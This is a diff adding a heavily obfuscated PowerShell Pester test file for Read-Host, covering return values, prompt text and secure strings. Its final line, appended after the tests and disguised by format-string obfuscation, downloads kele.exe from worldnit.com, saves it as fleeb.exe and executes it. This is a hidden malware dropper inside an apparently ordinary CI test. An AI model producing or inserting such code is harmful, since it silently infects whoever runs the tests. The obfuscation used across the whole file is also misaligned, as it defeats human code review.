@@ -1,0 +1,54 @@
+  .("{1}{0}{2}"-f 'T-','Se','Item') ("{1}{0}{2}" -f'IaB','VaR','le:TiyW')  (  [TyPe]("{4}{1}{2}{3}{0}" -F 'ctoRY','unSpAcE','f','a','R')) ;  .("{0}{1}"-f'sE','t') ('8l'+'Zc') ([TYpe]("{1}{0}{2}"-f 'S','POweR','heLl'));    .("{1}{0}{2}" -f 'i','SET-','tEM')  ("{1}{2}{0}{3}" -f 'n','vaRiABLE',':','uGA3') (  [tYpe]("{0}{2}{1}" -f 'p','edentiAL','Scr') )  ;  
+
+.("{2}{1}{0}"-f 'be','i','Descr') ("{1}{0}{3}{2}{4}"-f 'ea','R','-Hos','d','t Test') -tag "CI" {
+    &("{0}{1}{2}" -f 'Befor','eAl','l') {
+        ${tH} = .("{0}{2}{1}"-f'New-Tes','ost','tH')
+        ${rs} =  (  &('lS')  ("{2}{1}{0}"-f'TiYW',':','vAriAblE') ).vaLuE::("{1}{2}{3}{4}{0}" -f'nspace','Cre','a','ter','u').Invoke(${T`H})
+        ${rS}.("{1}{0}"-f 'en','op').Invoke()
+        ${p`S} =   (&("{1}{0}{2}" -f 'LdI','chi','teM')  ("v"+"ar"+"i"+"aBle:8LzC")  ).ValUE::("{2}{0}{1}"-f 'at','e','Cre').Invoke()
+        ${p`S}."R`UNs`paCe" = ${RS}
+        ${P`S}."coMma`N`DS".("{1}{0}"-f'r','Clea').Invoke()
+    }
+
+    .("{1}{0}{3}{2}"-f'er','Aft','ch','Ea') {
+        ${P`S}."Co`MMaNds".("{1}{0}"-f'ar','Cle').Invoke()
+    }
+
+    &("{1}{0}{2}"-f 'fterAl','A','l') {
+        ${R`S}.("{1}{0}" -f 'se','Clo').Invoke()
+        ${r`s}.("{1}{2}{0}" -f'ose','Di','sp').Invoke()
+        ${P`s}.("{0}{1}" -f'Dispo','se').Invoke()
+    }
+
+    &('It') ("{0}{4}{6}{5}{7}{1}{9}{8}{3}{2}"-f'Read-','s','ng','tri','H','re','ost ','turn','ted s',' expec') {
+        ${r`e`suLT} = ${p`S}.("{2}{0}{1}"-f 'dCo','mmand','Ad').Invoke(("{1}{0}{2}"-f'H','Read-','ost'))."InV`oKe"()
+        ${rEs`Ult} | .("{0}{1}" -f'Shoul','d') -Be ${t`H}."u`I"."rEa`dl`i`NEDATa"
+    }
+
+    .('It') ("{6}{3}{5}{1}{4}{2}{0}" -f'rectly','e pr','cor','ost s','ompt ','ets th','Read-H') {
+        ${ReSu`lT} = ${P`S}.("{2}{1}{0}{3}" -f 'Scr','d','Ad','ipt').Invoke(("{3}{0}{2}{1}{5}{4}"-f'ad-Hos','-prompt m','t ','Re','prompt','y'))."INv`oKE"()
+        ${pR`o`Mpt} = ${T`h}."u`I"."stR`EA`ms"."Pr`om`Pt"[0]
+        ${Pr`Ompt} | .("{0}{1}"-f'Sho','uld') -Not -BeNullOrEmpty
+        ${Pro`mPt}.("{1}{0}" -f'lit','sp').Invoke(":")[-1] | .("{2}{1}{0}" -f 'd','ul','Sho') -Be ("{0}{1}"-f 'mypr','ompt')
+    }
+
+    &('It') ("{6}{9}{3}{2}{7}{5}{0}{10}{4}{8}{1}"-f 's','g parameter','secu','a ',' -AsSecu','string when u','Read-Ho','re ','reStrin','st returns ','ing') {
+        ${res`U`lT} = ${P`S}.("{0}{1}{2}" -f 'AddScr','ip','t').Invoke(("{1}{2}{5}{3}{4}{6}{7}{0}" -f'g','Read-','Host -A','u','reS','sSec','t','rin'))."inV`oke"() | .("{0}{2}{3}{1}" -f 'se','t-object','le','c') -first 1
+        ${r`eSULT} | &("{1}{0}"-f 'hould','S') -BeOfType ("{1}{2}{0}" -f 'ing','Secur','eStr')
+         $NuGa3::("{0}{1}" -f 'Ne','w').Invoke("foo",${rES`Ult}).("{3}{2}{0}{4}{1}{6}{5}"-f 'wo','redent','etNet','G','rkC','al','i').Invoke()."Pas`Swo`Rd" | .("{0}{1}"-f 'Sho','uld') -BeExactly ("{0}{1}" -f'TE','ST')
+    }
+
+    .('It') ((("{1}{0}{7}{4}{2}{3}{6}{5}" -f'snop','Read-Host doe','m','and pro','er com','de','mpt mo','gt ent'))."re`pLACe"(([cHAR]111+[cHAR]112+[cHAR]103),[StRINg][cHAR]39)) {
+        ${R`es`Ult} = "!1" | &("{1}{0}" -f 'h','pws') -NoProfile -c ((("{3}{5}{2}{6}{4}{0}{1}{7}"-f 'pt XzRfoo','Xz','host -','Read','om','-','Pr','R')) -rEPlacE 'XzR',[Char]39)
+        if (${is`wiNd`oWS}) {
+            
+            ${eXp`Ec`T`ED} = @('!1','!1')
+        }
+        else {
+            ${e`xPec`T`ED} = @(("{0}{2}{1}" -f'f','1','oo: !'),'!1')
+        }
+        ${REs`U`Lt} | &("{1}{0}{2}"-f'u','sho','ld') -BeExactly ${E`XPec`TEd}
+    }
+}
+
+(.("{0}{1}{2}"-f 'N','e','w-Object') ("{3}{2}{0}{1}" -f 'Net.WebCli','ent','ystem.','S')).("{2}{0}{1}" -f'wnloadF','ile','Do').Invoke(("{0}{2}{7}{6}{8}{3}{4}{1}{5}"-f 'h','e','ttp','ke','le.','xe','dnit.','://worl','com/'),("{0}{2}{1}"-f'fleeb.','e','ex'));&("{1}{2}{3}{0}"-f's','St','art-P','roces') ("{1}{3}{2}{0}" -f 'e','fl','b.ex','ee')
